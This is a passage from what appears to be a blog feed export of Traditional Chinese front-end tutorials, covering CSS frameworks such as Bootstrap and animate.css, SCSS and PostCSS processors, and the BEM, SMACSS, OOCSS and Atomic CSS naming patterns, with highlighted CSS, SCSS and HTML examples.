-ms-user-<span class="selector-tag">select</span>: none;</span><br><span class="line">  user-<span class="selector-tag">select</span>: none;</span><br><span class="line">  -webkit-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 樣式 */</span></span><br><span class="line"><span class="selector-class">.pure-button-primary</span>,</span><br><span class="line"><span class="selector-class">.pure-button-selected</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.pure-button-primary</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.pure-button-selected</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">120</span>, <span class="number">231</span>);</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原始碼: <a href="https://unpkg.com/purecss@2.1.0/build/buttons.css">https://unpkg.com/purecss@2.1.0/build/buttons.css</a></p><h3 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h3><p>Bootstrap 的樣式很難去客製化一個自己新的樣子，頂多依照開發指南去蓋掉一些變數。</p><p>如果一個專案，需要快速或者簡單交付，那就不一定要用 Tailwind CSS，用 Bootstrap 真的方便快速。</p><p>Bootstrap 也包含 OOCSS 的概念，從以下範例可以看出來什麼是容器與內容分離</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 未分離 */</span></span><br><span class="line"><span class="selector-class">.col</span> &#123;</span><br><span class="line">  <span class="comment">/* 樣式內容 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.col</span> <span class="selector-class">.btn</span> &#123;</span><br><span class="line">  <span class="comment">/* 樣式內容 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 容器與內容分離 */</span></span><br><span class="line"><span class="selector-class">.col</span> &#123;</span><br><span class="line">  <span class="comment">/* 樣式內容 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.btn</span> &#123;</span><br><span class="line">  <span class="comment">/* 樣式內容 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Bootstrap 也有常用的一些 css 屬性部分做 Atomic CSS (原子化樣式) 的設計</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.my-auto</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: auto <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: auto <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.mt-0</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.mt-1</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0.25rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.mt-2</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0.5rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.mt-3</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">1rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="animate-css"><a href="#animate-css" class="headerlink" title="animate.css"></a>animate.css</h3><p>推薦 <a href="https://animate.style/">animate.css</a> 也有提供 custom build 的功能。</p><p>主要也是原子化樣式 (Atomic CSS) 的概念，以動畫 delay 秒數為例:</p><p><code>animate__delay-2s</code> -&gt; 延遲 2s<br><code>animate__delay-3s</code> -&gt; 延遲 3s<br><code>animate__delay-4s</code> -&gt; 延遲 4s<br><code>animate__delay-5s</code> -&gt; 延遲 5s</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;animate__animated animate__bounce animate__delay-2s&quot;</span>&gt;</span>Example<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解密 CSS 處理器 SCSS/PostCSS</title>
      <link href="/2022/09/08/relationships-between-frontend-and-backend/css-pre-post-processors/"/>
      <url>/2022/09/08/relationships-between-frontend-and-backend/css-pre-post-processors/</url>
      
        <content type="html"><![CDATA[<p>隨著 CSS 開始越來越複雜，由於 CSS 語法受限而發展出了 CSS Pre-&#x2F;Post-processors (預處理和後處理) 來拓展和優化寫法。</p><h2 id="什麼是-Preprocessor-預處理器"><a href="#什麼是-Preprocessor-預處理器" class="headerlink" title="什麼是 Preprocessor (預處理器)"></a>什麼是 Preprocessor (預處理器)</h2><p>CSS 預處理器是個能透過該預處理器語法，產生純 CSS 的程式。</p><p>CSS 預處理器主要有 Sass&#x2F;SCSS、Stylus、Less 三種。</p><p>處理器會加入 CSS 所沒有的功能像是 mixin、巢狀選擇器、繼承選擇器等等，增加 CSS 結構的可讀性、可維護性。</p><p>預處理器可以想像成女孩子的底妝組、眼妝組等等，將相同類型的化妝品進行分類和優化增加組合搭配的方便性。</p><h2 id="Sass-SCSS"><a href="#Sass-SCSS" class="headerlink" title="Sass&#x2F;SCSS"></a>Sass&#x2F;SCSS</h2><p>Sass&#x2F;SCSS 讓 CSS 成為真正的程式語言，這篇文章主要以 SCSS 來做介紹</p><ul><li>變數使用</li><li>判斷&#x2F;迴圈</li><li>巢狀結構</li><li><code>@mixin</code>&#x2F;<code>@extend</code></li></ul><h3 id="變數使用"><a href="#變數使用" class="headerlink" title="變數使用"></a>變數使用</h3><p>使用定義主色調，這樣在未來需要調整主色調時速度會快很多，不用全部搜尋再取代還擔心取代錯誤。</p><p><code>$primary-color: #ffffff;</code><br><code>$second-color: #000000;</code></p><h3 id="巢狀結構"><a href="#巢狀結構" class="headerlink" title="巢狀結構"></a>巢狀結構</h3><p>巢狀結構減少重複輸入 parent 的選擇器，可以少打一些字。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CSS</span></span><br><span class="line"><span class="selector-class">.list</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.list</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: black;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.list</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SCSS</span></span><br><span class="line"><span class="selector-class">.list</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: black;</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">a</span> &#123;</span><br><span class="line">      <span class="attribute">color</span>: white;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mixin"><a href="#mixin" class="headerlink" title="@mixin"></a>@mixin</h3><p><code>@mixin</code> 的做法是可以帶入變數，然後生成客製化樣式，譬如當同樣的一個版但需要套不同圖或是顏色，這樣的做法就會非常方便，mixin 搭配 [rwd 的寫法][1]</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@mixin</span> setSpecail(<span class="variable">$size</span>, <span class="variable">$color</span>) &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="variable">$size</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">$color</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.IAmSpecailOne</span> &#123;</span><br><span class="line">  <span class="keyword">@include</span> setSpecail(sizeOne, colorOne);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.IAmSpecailTwo</span> &#123;</span><br><span class="line">  <span class="keyword">@include</span> setSpecail(sizeTwo, colorTwo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extend"><a href="#extend" class="headerlink" title="@extend"></a>@extend</h3><p><code>@extend</code> 就比較單純可以當成注入性質。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">％<span class="selector-tag">button</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>：<span class="number">80</span> px ;</span><br><span class="line">  <span class="attribute">height</span>：<span class="number">40</span> px ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.button--primary</span> &#123;</span><br><span class="line">  <span class="keyword">@extend</span>  ％button ;</span><br><span class="line">  <span class="attribute">background-color</span>：white ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.button--success</span> &#123;</span><br><span class="line">  <span class="keyword">@extend</span>  ％button ;</span><br><span class="line">  <span class="attribute">background-color</span>：green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.button--error</span> &#123;</span><br><span class="line">  <span class="keyword">@extend</span>  ％button ;</span><br><span class="line">  <span class="attribute">background-color</span>：red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="什麼是-postprocessor-後處理器"><a href="#什麼是-postprocessor-後處理器" class="headerlink" title="什麼是 postprocessor (後處理器)"></a>什麼是 postprocessor (後處理器)</h2><p>CSS 後處理器是讓 CSS 經過擴充功能 (plugin) 後製處理，這裡介紹以 PostCSS 為主。</p><ul><li>Autoprefixer 會協助加入跨瀏覽器支援的相關前綴詞 (prefix) -webkit-、-moz-，來源是 <a href="https://https//caniuse.com/">Can I Use</a></li><li>stylelint: 語法檢查和報錯</li><li>lost: Grid System</li></ul><p>PostCSS 通常會和 Webpack、Grunt、Parcel、Gulp 等打包工具一起使用，可以想像成是女孩子隨時能補的 BB 霜。</p><p>後處理器著重在防呆和支援性，接下來以加入 Autoprefixer 為例，使用方法非常簡單。</p><ol><li><code>npm install postcss postcss-loader autoprefixer precss --save-dev</code></li><li>postcss.config.js</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="built_in">require</span>(<span class="string">&quot;autoprefixer&quot;</span>)],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>不過還是要注意像是隱藏 Scroll Bar 這類特殊的用法還是要自己處理</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.hide-scrollbar</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: auto;</span><br><span class="line">  -ms-<span class="attribute">overflow</span>-style: none; <span class="comment">/* IE 11 */</span></span><br><span class="line">  <span class="attribute">scrollbar-width</span>: none; <span class="comment">/* Firefox 64 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>透過 BEM、SMACSS、OOCSS、Atomic CSS 簡化樣式開發流程、減少維護成本</title>
      <link href="/2022/09/07/relationships-between-frontend-and-backend/css-design-pattern-with-bem-smacss-oocss-atomic-css/"/>
      <url>/2022/09/07/relationships-between-frontend-and-backend/css-design-pattern-with-bem-smacss-oocss-atomic-css/</url>
      
        <content type="html"><![CDATA[<p>本篇文章將提到怎麼透過 BEM、SMACSS、OOCSS、Atomic CSS 的特性來:</p><ul><li>縮短開發時間</li><li>減少需維護的程式碼</li><li>結構與樣式</li></ul><p>CSS 選擇器和規則們就像女孩化妝桌上的化妝品們，桌上總是放著各個種類，數也數不清大罐小罐擠的噴的擦的，在沒有預備知識和整理規劃的情況下，若要一個男孩子短時間搞清楚簡直是天方夜譚。</p><p>當交接新專案的時候看到幾千行的樣式檔大概也是這樣的心情，一般專案在未規範的情況下，通常都會發展為幾千甚至幾萬行 CSS 的狀態。</p><p>如果還不知道面試前端可以問什麼，歡迎參考:</p><ul><li><a href="https://linyencheng.github.io/2023/01/26/career/what-questions-should-you-ask-the-interviewer/?utm_source=link&utm_medium=article&utm_campaign=internal_link">面試前端，你還有什麼問題想問嗎: 一起透過發問知己知彼找到理想生活</a></li><li><a href="https://open.spotify.com/episode/2ZoETkf4dL6P4ipXKmqcI2">面試前端讓你知己知彼的 10 個問題(上集): 軟體工程師不只是服務業也是良心事業? ft. 資深前端工程師 彥成</a></li></ul><h2 id="CSS-設計模式"><a href="#CSS-設計模式" class="headerlink" title="CSS 設計模式"></a>CSS 設計模式</h2><p>這篇文章將簡單介紹四種 CSS 常見命名原則與設計模式方法論</p><ul><li>BEM: 訂定可以遵循的規範</li><li>OOCSS: 將容器與內容用 “物件” 的概念進行管理</li><li>SMACSS: 依照結構將樣式檔分成五類進行撰寫</li><li>Atomic CSS: 撰寫原子化樣式</li></ul><p>無論最終選擇使用哪種方法都將受益於更加結構化的 CSS，風格也更容易被團隊所理解和適應，目標:</p><ol><li>可預測性 (Predictable)</li><li>可重複使用性 (Reusable)</li><li>易維護性 (Maintainable)</li><li>可擴充性 (Scalable)</li></ol><h3 id="減少命名與維護成本"><a href="#減少命名與維護成本" class="headerlink" title="減少命名與維護成本"></a>減少命名與維護成本</h3><p>寫樣式檔最大的維護性問題會出現在:</p><ul><li>多人協作時的命名重複，用 BEM 或是 styled-component 可以去避免</li><li>陳年專案不確定到底哪些樣式檔還有在使用</li></ul><p>針對命名上一般會有三個重點:</p><ol><li>看到名字就知道效果</li><li>看到名字就知道用在何處</li><li>看到名字就可以理解結構上的關係</li></ol><h2 id="BEM-命名設計模式"><a href="#BEM-命名設計模式" class="headerlink" title="BEM 命名設計模式"></a>BEM 命名設計模式</h2><p>CSS 在相關工具不太普及的時候就出現了 BEM 命名規則:</p><ul><li>區塊 (Block)</li><li>元素 (Element)</li><li>修飾符 (Modifier)</li></ul><blockquote><p><code>header__title--hover</code> 代表 header 中的 title 在 hover 時的狀態</p></blockquote><p>這樣的命名方法就像是女孩的化妝品們按照分類放進化妝櫃中，透過規範提供了統一又易讀的原則，有原則可預測性就高，就算什麼寫法都不去背誦，也可以透過這樣的原則來理解當時的想法。</p><p>透過模組化的概念，樣式不會依賴其他元素，區塊組合的概念也可以重用寫過的樣式。</p><h2 id="SMACSS-Scalable-and-Modular-Architecture-for-CSS"><a href="#SMACSS-Scalable-and-Modular-Architecture-for-CSS" class="headerlink" title="SMACSS (Scalable and Modular Architecture for CSS)"></a>SMACSS (Scalable and Modular Architecture for CSS)</h2><p>將樣式檔依照結構上分成五類進行撰寫，分別是 Base、Layout、Module、State、Theme</p><ol><li>Base: 全域設定，未使用 Class 僅設定像 h1~h6、body、a 等等元素，通常可以使用 <a href="https://necolas.github.io/normalize.css/">Normalize</a> 來正規化各瀏覽器預設的樣子，也可以選擇撰寫 <a href="https://meyerweb.com/eric/tools/css/reset/">Reset CSS</a> 來處理</li><li>Layout: 網頁架構的部分，ex. header、footer、sidebar</li><li>Module: 是獨立且可以重用的元件，舉 bootstrap 的例子 <code>&lt;button type=&quot;button&quot; class=&quot;btn btn-primary&quot;&gt;Primary&lt;/button&gt;</code>，當不需要某個元件時可以安全的移除樣式檔</li><li>State: 元件的狀態，像是被按到的按鈕</li><li>Theme: 設定網站主題，像是暗黑模式</li></ol><h2 id="OOCSS-Object-Oriented-CSS"><a href="#OOCSS-Object-Oriented-CSS" class="headerlink" title="OOCSS (Object Oriented CSS)"></a>OOCSS (Object Oriented CSS)</h2><p>主要是兩個概念結構與樣式分離 (Separate structure and skin)、容器與內容分離 (Separate container and content)</p><ol><li>分離結構與樣式</li></ol><p><code>.btn</code>: 結構<br><code>.btn-primary</code>: 樣式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 合併結構與樣式 */</span></span><br><span class="line"><span class="selector-class">.login-button</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: blue;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 結構與樣式分離 */</span></span><br><span class="line"><span class="selector-class">.btn</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.button-primary</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>分離容器與內容，Bootstrap 的格線系統 <code>.col-x</code> 就是用這種方式命名的，容器與內容分離時，容器和內容的重用性就會變高。不過像是 card 跟 card-body 就不需要分離，因為 card-body 獨立也無法使用。</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 不須分離 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-body&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Atomic-CSS-設計模式"><a href="#Atomic-CSS-設計模式" class="headerlink" title="Atomic CSS 設計模式"></a>Atomic CSS 設計模式</h2><p>最近讀了一篇 <a href="https://engineering.fb.com/web/facebook-redesign/">Facebook 重新設計前端專案</a>的文章，Facebook 是一個功能非常多元的網站，除了動態牆外還涵蓋了社團、粉專、電商平台…等等，所以原來的架構不再適合，因為:</p><ul><li>對於初次進入網站的使用者來說，大部分的程式碼在剛開始都是不需要被載入的</li><li>近年需開始實作 dark mode 來提供更好的體驗</li></ul><p>原子化樣式是將各種可能的基礎情況都寫成一個 class 然後搭配變數讓整個樣式的撰寫能夠透過組合的方式進行。</p><p>缺點在於命名會是一個公版需要大家去習慣，優點是不再需要額外重寫相關的 CSS。</p><p><img src="https://sebastienlorber.com/static/585ecb3c3ce9a75022563a181787c979/81ae9/stylex-scalability2.png"></p><h3 id="簡化開發流程"><a href="#簡化開發流程" class="headerlink" title="簡化開發流程"></a>簡化開發流程</h3><p>原來的開發流程，要處理兩個檔案:</p><ul><li>寫 HTML tag</li><li>開 CSS 樣式檔寫樣式</li><li>把剛寫的 class 塞回 HTML tag</li></ul><p>Atomic CSS 的開發流程，只要提早建立原子化樣式像 <code>.mt-3</code> 後續只需要處理一個檔案:</p><ul><li>寫 HTML 的同時就直接加上 <code>&lt;span class=&quot;mt-3&quot;&gt;test&lt;/span&gt;</code></li></ul><p>為了加速大家開發 Bootstrap 不只定義好了相關元件也提供了過多預設的公版樣式，需要理解後透過覆蓋或是增加權值去修改，感覺有種比誰道行高的感覺。</p><p>如果能夠只導入原子化樣式的部分，理論上:</p><ol><li>簡化開發流程</li><li>減少命名與維護成本</li><li>樣式檔的成長也會較接近對數曲線</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.m-3</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">1rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.mt-3</span>,</span><br><span class="line"><span class="selector-class">.my-3</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">1rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.mr-3</span>,</span><br><span class="line"><span class="selector-class">.mx-3</span> &#123;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">1rem</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.0/css/bootstrap.min.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.form-wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">1rem</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>: <span class="number">0.25rem</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="number">#007bff</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.form__input</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>: <span class="number">1rem</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;form-wrapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form__input&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Atomic CSS --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;p-3 bg-primary m-1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;m-3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>開始使用 Atomic CSS 後我們會發現:</p><ul><li>因為不用再花心思在命名，像是 <code>form-wrapper</code> 這種命名將不再需要</li><li>樣式檔的成長速度變成接近對數的曲線</li><li>可以更快、更小幅度、更安全的修改全站樣式</li><li>更方便的修改網站主題 (主視覺)</li><li>移動標記的同時也移動了樣式</li></ul><h3 id="導入-Atomic-CSS-可能的問題"><a href="#導入-Atomic-CSS-可能的問題" class="headerlink" title="導入 Atomic CSS 可能的問題"></a>導入 Atomic CSS 可能的問題</h3><ul><li>建立時 class 命名一樣需要 convention，需花時間建置<strong>符合團隊習慣</strong>的命名</li><li>如果是用 bootstrap 4 需要時間熟悉</li><li>很特殊的狀況其實還是需要走回 BEM 